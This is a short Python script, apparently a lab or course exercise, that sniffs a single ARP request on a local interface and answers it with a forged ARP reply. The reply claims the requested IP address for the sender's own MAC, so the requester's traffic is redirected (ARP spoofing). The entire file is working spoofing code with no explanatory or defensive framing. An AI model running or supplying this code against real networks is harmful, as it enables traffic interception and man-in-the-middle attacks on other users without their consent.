#arp_final.py

from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 MAC
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_arp_packets(packet):
    if ARP in packet and packet[ARP].op == 1:
        hisMAC = packet[Ether].src
        ether_resp = Ether(dst=hisMAC, type=0x806, src=macaddr)
        arp_response = ARP(hwtype=0x1, ptype=0x800, hwlen=6, plen=4,
                           op = 'is-at',
                           hwsrc = macaddr,
                           psrc = packet[ARP].pdst,
                           hwdst = packet[ARP].hwsrc,
                           pdst = packet[ARP].psrc
                           )
        response = ether_resp/arp_response
        print(response.show())
        sendp(response, iface="eth0")
    return(packet[ARP].pdst)

berkeley_packet_filter = "(arp[6:2] = 1)"
spoofedIP = sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

print('We spoofed {}'.format(spoofedIP))
